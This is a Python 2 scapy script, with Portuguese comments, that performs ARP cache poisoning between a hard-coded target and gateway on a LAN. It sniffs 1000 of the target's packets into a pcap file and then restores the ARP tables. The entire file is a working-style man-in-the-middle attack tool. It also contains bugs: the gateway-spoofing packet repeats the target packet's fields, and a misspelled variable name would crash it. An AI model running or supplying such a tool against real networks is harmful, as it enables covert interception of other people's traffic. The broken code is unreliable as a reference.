# coding: utf-8

from scapy.all import *
import os
import sys
import threading

interface       = "ens33"
target_ip       = "192.168.192.6"
gateway_ip      = "192.168.192.1"
packet_count    = 1000
poisoning       = True

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10)

    # retorna o endereço MAC de uma resposta
    for s,r in responses:
        return r[Ether].src
    
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    global poisoning

    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = target_ip
    poison_target.pdst = gateway_ip
    poison_target.hwdst = gateway_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    posion_gateway.hwdst = gateway_mac

    print "[*] Beginning the ARP poison. [CTRL-C to stop]"

    while poisoning:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    
    print "[*] ARP poison attack finished."
    return 


# define a nossa interface
conf.iface = interface
# desabilita a saída
conf.verb = 0

print "[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!] Failed to get gateway MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Gateway is %s at %s" % (gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!] Failed to get target MAC. Exiting."
    sys.exit(0)
else:
    print "[*] Target %s is at %s" % (target_ip, target_mac)

# inicia a thread de envenenamento 
poison_thread = threading.Thread(target= poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

try:
    print "[*] Starting sniffer for %d packets" % packet_count
    bpf_filter = "ip host %s" %target_ip
    packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)

    # grava os pacotes capturados
    wrpcap('arper.pcap', packets)

    # restaura a rede
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    # restaura a rede
    restore_target(gateway_ip, gateway_mac, target_ip, target_mac)